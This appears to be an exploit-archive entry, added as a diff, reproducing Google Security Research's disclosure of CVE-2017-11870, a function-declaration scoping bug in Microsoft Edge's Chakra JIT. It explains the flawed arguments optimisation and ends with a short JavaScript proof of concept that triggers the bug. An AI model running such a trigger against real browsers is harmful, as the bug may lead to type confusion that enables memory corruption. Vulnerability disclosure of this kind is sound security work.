@@ -1,0 +1,54 @@
+id: 29055
+date: 11/26/2017
+title: Microsoft Edge Chakra JIT Incorrect Function Declaration Scope Exploit
+author: Google Security Research
+cves: CVE-2017-11870
+
+Microsoft Edge: Chakra: JIT: Incorrect function declaration scope 
+
+CVE-2017-11870
+
+
+In the following JavaScript code, both of the print calls must print out "undefined" because of "x" is a formal parameter. But the second print call prints out "function x() { }". This bug may lead to type confusion in JITed code.
+
+function f(x) {
+    print(x);
+
+    {
+        function x() {
+
+        }
+    }
+
+    print(x);
+}
+
+The following code in "PreVisitFunction" is used to decide how to optimize arguments.
+    bool doStackArgsOpt = (!pnode->sxFnc.HasAnyWriteToFormals() || funcInfo->GetIsStrictMode());
+
+"HasAnyWriteToFormals" set by "Parser::BindPidRefsInScope" returns true in the following example code where "x" is formal. But the method can't detect the above buggy case, so it may end up wrongly optimizing arguments.
+
+function f(x) {
+    x = 1;
+}
+
+
+PoC:
+function f(x) {
+    arguments;
+
+    {
+        function x() {
+        }
+    }
+}
+
+for (let i = 0; i < 10000; i++)
+    f();
+
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse
+or a patch has been made broadly available, the bug report will become
+visible to the public.
+
+#  0day.today [2023-03-26]  #
